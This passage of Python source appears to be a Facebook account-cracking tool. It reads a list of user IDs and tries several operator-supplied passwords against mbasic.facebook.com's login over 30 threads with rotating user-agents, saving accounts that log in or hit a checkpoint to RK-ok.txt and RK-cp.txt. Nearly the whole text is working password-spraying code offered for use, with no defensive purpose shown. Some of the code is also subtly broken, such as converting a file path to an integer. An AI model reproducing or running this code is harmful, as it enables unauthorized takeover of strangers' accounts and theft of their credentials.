                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+ps2
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+ps3
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = first+ps4
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] Cloning Complete Result ........")
    print (39*'-')
    print ('[!] Total Ok Ids : '+str(len(oks)))
    print ('[!] Total Cp Ids: '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press Enter To Back ')
    main()

def f_p_pass():
    os.system('clear')
    print (logo)
    print ("")
    ps1=int(input('[1] Password : '))
    ps2=int(input('[2] Password : '))
    ps3=int(input('[3] Password : '))
    ps4=int(input('[4] Password : '))
    ps5=int(input('[5] Password : '))
    ps6=int(input('[6] Password : '))
    print ("")
    try:
        mf=int(input('[!] Enter path :'))
        print ('')
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        n_f_p_pass()
        
        
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print (("    Cracking Start Please Wait .."))
    print ( "   Use Flight Mod For Speed Up")
    os.system('echo " -----------------------------------"| lolcat')
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = ps1
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2= ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3=ps3
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4=ps4
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5=ps5
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                                else:
                                                    pass6=ps6
                                                    rana = requests.Session()
                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                                    p = rana.get('https://mbasic.facebook.com')
                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass6)
                                                        ok=open('RK-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        oks.append(uid+pass6)
                                                    else:
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass6)
                                                            cp=open('RK-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
                                                            cps.append(uid+pass6)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] Cloning Complete Result ........")
    print (39*'-')
    print ('[!] Total OK IDS : '+str(len(oks)))
    print ('[!] Total CP IDS :'+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press Enter To Back ')
    fb_menu()

if __name__=='__main__':
    main_apv()
